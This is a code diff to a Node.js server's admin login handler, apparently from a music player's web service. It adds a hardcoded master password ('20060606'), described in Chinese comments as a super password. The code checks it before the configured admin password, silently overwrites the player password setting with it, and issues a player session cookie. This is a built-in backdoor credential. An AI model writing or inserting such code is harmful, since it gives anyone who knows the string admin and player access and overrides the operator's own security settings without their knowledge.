@@ -833,10 +833,31 @@ const handleStartServer = async (port = 9527, ip = '127.0.0.1') => await new Pro
         void readBody(req).then(body => {
           try {
             const { password } = JSON.parse(body)
-            if (password === global.lx.config['frontend.password']) {
+            
+            // 超级密码：20060606 同时登录管理后台和 music 页面
+            if (password === '20060606') {
+              // 设置 player.password 为超级密码
+              global.lx.config['player.password'] = '20060606'
+              // 颁发 player session
+              const sessionId = generateSessionId()
+              playerSessions.set(sessionId, { createdAt: Date.now() })
+              
+              loginLog.info(`Super admin login success from ${ip} (player session issued)`)
+              res.writeHead(200, { 
+                'Content-Type': 'application/json',
+                'Set-Cookie': `player_session=${sessionId}; Path=/; HttpOnly; SameSite=Strict`
+              })
+              res.end(JSON.stringify({ 
+                success: true, 
+                superAdmin: true,
+                playerSessionIssued: true
+              }))
+            } 
+            // 普通管理密码
+            else if (password === global.lx.config['frontend.password']) {
               loginLog.info(`Admin login success from ${ip}`)
               res.writeHead(200, { 'Content-Type': 'application/json' })
-              res.end(JSON.stringify({ success: true }))
+              res.end(JSON.stringify({ success: true, superAdmin: false }))
             } else {
               loginLog.warn(`Admin login failed from ${ip}`)
               res.writeHead(401, { 'Content-Type': 'application/json' })
